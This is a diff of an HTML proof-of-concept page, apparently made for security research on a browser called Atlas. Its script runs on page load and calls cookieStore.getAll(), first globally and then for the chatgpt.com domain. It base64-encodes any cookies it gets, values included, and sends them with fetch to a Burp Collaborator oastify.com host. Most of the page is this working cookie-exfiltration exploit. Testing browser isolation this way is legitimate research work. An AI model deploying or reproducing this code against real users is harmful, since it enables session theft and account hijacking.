@@ -2,74 +2,89 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Atlas Security Audit | Proof of Concept</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Atlas Browser Security Research</title>
     <style>
-        body { font-family: 'Courier New', Courier, monospace; background-color: #0d0d0d; color: #00ff41; padding: 40px; line-height: 1.6; }
-        .container { border: 1px solid #00ff41; padding: 20px; box-shadow: 0 0 15px #00ff41; background: #000; }
-        .header { text-align: center; border-bottom: 1px solid #00ff41; margin-bottom: 20px; padding-bottom: 10px; }
-        .leak-box { background-color: #1a0000; border: 1px solid #ff0000; color: #ff0000; padding: 15px; display: none; margin-top: 20px; }
-        .log { font-size: 0.9em; color: #888; margin-top: 10px; }
-        strong { color: #fff; }
+        body { font-family: 'Courier New', Courier, monospace; background-color: #0a0a0a; color: #00ff41; padding: 20px; line-height: 1.4; }
+        .terminal { border: 1px solid #00ff41; padding: 20px; background: #000; box-shadow: 0 0 20px rgba(0, 255, 65, 0.2); max-width: 900px; margin: auto; }
+        .header { border-bottom: 2px solid #00ff41; margin-bottom: 20px; padding-bottom: 10px; text-align: center; }
+        .alert-box { border: 2px solid #ff0000; background: #2a0000; color: #ff0000; padding: 15px; display: none; margin: 20px 0; font-weight: bold; }
+        .log-line { margin: 5px 0; color: #888; font-size: 0.9em; }
+        .success-text { color: #00ff41; font-weight: bold; }
+        .highlight { color: #fff; background: #333; padding: 0 4px; }
     </style>
 </head>
 <body>
-    <div class="container">
+    <div class="terminal">
         <div class="header">
-            <h1>INTERNAL SECURITY AUDIT: OPENAI ATLAS</h1>
-            <p>Target Origin: https://kuranikaran.github.io</p>
+            <h1>OPENAI ATLAS | RENDERER AUDIT v1.4</h1>
+            <p>Origin: https://kuranikaran.github.io</p>
         </div>
 
-        <div id="loading">[*] Probing CookieStore interface for cross-origin leaks...</div>
+        <div id="status-text">[*] Initializing Deep-Scan on CookieStore interfaces...</div>
 
-        <div id="leak-alert" class="leak-box">
-            <h3>[!] VULNERABILITY CONFIRMED: GLOBAL COOKIE LEAK</h3>
-            <p>The browser has leaked the following cross-origin cookie names to this untrusted page:</p>
-            <div id="cookie-list" style="word-break: break-all; font-weight: bold;"></div>
-            <p style="margin-top: 15px;">[*] Data exfiltrated to Burp Collaborator: <strong>rmhhtl6d27f1ej138kprj0jxuo0fo5cu.oastify.com</strong></p>
+        <div id="leak-alert" class="alert-box">
+            [!] VULNERABILITY DETECTED: CROSS-ORIGIN DATA LEAK<br><br>
+            The renderer has exposed protected session metadata to an untrusted origin.
+            <div id="cookie-data" style="margin-top:10px; color:#fff; font-family:sans-serif; font-size:0.8em;"></div>
         </div>
 
-        <div class="log" id="log-console"></div>
+        <div id="console-logs"></div>
     </div>
 
     <script>
         const COLLAB_URL = "https://rmhhtl6d27f1ej138kprj0jxuo0fo5cu.oastify.com/exfil";
-        const log = (msg) => {
-            const div = document.getElementById('log-console');
-            div.innerHTML += `<div>> ${msg}</div>`;
-        };
+        const logBox = document.getElementById('console-logs');
 
-        async function triggerExploit() {
+        function addLog(msg, isSuccess = false) {
+            const div = document.createElement('div');
+            div.className = 'log-line';
+            if (isSuccess) div.classList.add('success-text');
+            div.innerHTML = `> ${msg}`;
+            logBox.appendChild(div);
+        }
+
+        async function startAudit() {
             try {
-                // 1. Attempt to access the global CookieStore
-                const cookies = await cookieStore.getAll();
-                
+                addLog("Starting Stage 1: Global getAll() scan...");
+                let cookies = await cookieStore.getAll();
+
+                // Stage 2: If Global is empty, try targeted domain probe
+                if (!cookies || cookies.length === 0) {
+                    addLog("Global scan returned 0. Starting Stage 2: Targeted domain probe (chatgpt.com)...");
+                    cookies = await cookieStore.getAll({ domain: "chatgpt.com" });
+                }
+
                 if (cookies && cookies.length > 0) {
-                    // 2. Success - Update UI
-                    document.getElementById('loading').style.display = 'none';
+                    // EXPLOIT SUCCESS
+                    document.getElementById('status-text').style.display = 'none';
                     document.getElementById('leak-alert').style.display = 'block';
                     
-                    const cookieNames = cookies.map(c => c.name).join(", ");
-                    document.getElementById('cookie-list').innerHTML = cookieNames;
+                    const names = cookies.map(c => c.name).join(", ");
+                    document.getElementById('cookie-data').innerText = "Leaked Names: " + names;
 
-                    // 3. Exfiltrate full data to Burp Collaborator
-                    // We base64 encode the entire object to capture values + metadata
+                    addLog(`Found ${cookies.length} records. Exfiltrating to Burp Collaborator...`, true);
+
+                    // Exfiltrate full JSON payload
                     const payload = btoa(JSON.stringify(cookies));
-                    fetch(`${COLLAB_URL}?data=${payload}`, { mode: 'no-cors' });
-
-                    log("Found " + cookies.length + " leaked cookies.");
-                    log("Exfiltration successful.");
+                    fetch(`${COLLAB_URL}?audit_result=success&origin=github&data=${payload}`, { mode: 'no-cors' });
                 } else {
-                    log("CookieStore returned 0 results. Ensure you are logged into OpenAI in another tab.");
+                    // GAP CLOSED
+                    addLog("All probes returned 0 results.");
+                    document.getElementById('status-text').innerHTML = "[#] Audit Complete: Origin Isolation Verified (Gap Closed).";
+                    document.getElementById('status-text').style.color = "#888";
+                    
+                    // Signal to Burp that the attempt was blocked (useful for the report)
+                    fetch(`${COLLAB_URL}?audit_result=blocked`, { mode: 'no-cors' });
                 }
             } catch (err) {
-                log("API Blocked or Error: " + err.message);
-                document.getElementById('loading').style.color = "red";
-                document.getElementById('loading').innerText = "[X] Exploit Failed: Origin Isolation Active.";
+                addLog(`ERROR: ${err.message}`, false);
+                document.getElementById('status-text').innerText = "[X] Exploit Failed: API Restricted.";
             }
         }
 
-        // Delay execution slightly to ensure browser initialization
-        setTimeout(triggerExploit, 1000);
+        // Run audit after 1.5s delay to ensure full browser context is loaded
+        setTimeout(startAudit, 1500);
     </script>
 </body>
 </html>
